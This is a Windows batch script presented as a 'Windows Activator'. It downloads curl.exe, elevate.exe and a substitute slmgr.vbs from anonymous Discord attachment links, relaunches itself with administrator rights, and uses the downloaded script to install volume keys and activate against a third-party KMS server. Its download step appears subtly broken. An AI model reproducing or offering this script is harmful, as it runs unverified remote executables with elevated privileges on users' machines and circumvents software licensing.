@echo off

cd %userprofile% 

:: Version
set ver=2.0

cd %userprofile%
if exist "%userprofile%\curl.exe" (goto curlfound) else (
echo [93;40m             Downloading curl...
set DL="https://cdn.discordapp.com/attachments/944657981063168060/985445802753273877/curl.exe"
powershell -NoProfile -Command "$ProgressPreference = 'SilentlyContinue' Invoke-WebRequest -Uri !DL! -OutFile %userprofile%\curl.exe" >nul 2>&1
)

:curlfound

if not exist "%userprofile%\elevate.exe" (
    echo [97;101mDownloading elevate... [0m
    "%userprofile%\curl.exe" -s -o "%userprofile%\elevate.exe" "https://cdn.discordapp.com/attachments/944657981063168060/985445196600868914/Elevate.exe" 2>nul
)

mode 69,23 && title Activator v%ver%
net session 2>nul >nul
if %errorlevel% neq 0 (
echo.
echo.  Please run this program as administrator.
cd "%userprofile%" & elevate.exe -noui "%~s0"
ping localhost -n 2 >nul
exit /b
)

if not exist "%userprofile%\slmgr.vbs" (
    echo [97;101mDownloading activation script... [0m
    curl -s -o "%userprofile%\slmgr.vbs" "https://cdn.discordapp.com/attachments/861805950338990121/953933571058446336/slmgr.vbs"
)

:Activator
rem Version of Windows
for /f "delims== tokens=2" %%i in ('wmic os get Caption /value') do set windowsversion=%%i

:GUI
mode 69,10
for /f "tokens=3 delims=: " %%a in ('cscript //nologo "%userprofile%\slmgr.vbs" /dli ^| find "License Status:"') do set activationstatus=%%a
if "%activationstatus%"=="Licensed" (set activationstatus=[92;40mLicensed) else (set activationstatus=[31;40mUnlicensed)
title Wintivator v%ver%
cls & echo [30;43m                  Windows Activator v%ver% \ Lux#0594                  [0m
echo.
echo   [33;40mActivation Status: [0m%activationstatus%
echo   [33;40mDetected Windows Version: [0m%windowsversion% & echo. & echo                  [33;40mThis program is coded by: [0mLux#0594 & echo.
ping localhost -n 2 >nul

if "%windowsversion%"=="Microsoft Windows 10 Home" (set key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99 & goto:ProcessActivation)
if "%windowsversion%"=="Microsoft Windows 10 Pro" (set key=W269N-WFGWX-YVC9B-4J6C9-T83GX & goto:ProcessActivation)
if "%windowsversion%"=="Microsoft Windows 11 Home" (set key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99 & goto:ProcessActivation)
if "%windowsversion%"=="Microsoft Windows 11 Pro" (set key=W269N-WFGWX-YVC9B-4J6C9-T83GX & goto:ProcessActivation)

set windowsversion=Could not detect...
echo   [31;40mPlease send your Windows Version to: [0mLux#0594 ^| via Discord.com
echo   [33;40mPress any key to refresh...[0m & pause >nul
goto:GUI

:ProcessActivation
cscript //B slmgr.vbs /ipk "%key%"
cscript //B slmgr.vbs /skms kms.lotro.cc
for /f "tokens=3 delims=: " %%a in ('cscript //nologo slmgr.vbs /ato ^| find "successfully"') do set output=%%a
if "%output%"=="successfully." (echo   [92;40mSuccessfully activated windows!)
if not defined output (echo   [31;40mError, windows corrupt or restart your computer.)
echo   [33;40mPress any key to refresh...[0m & pause >nul
goto:GUI
exit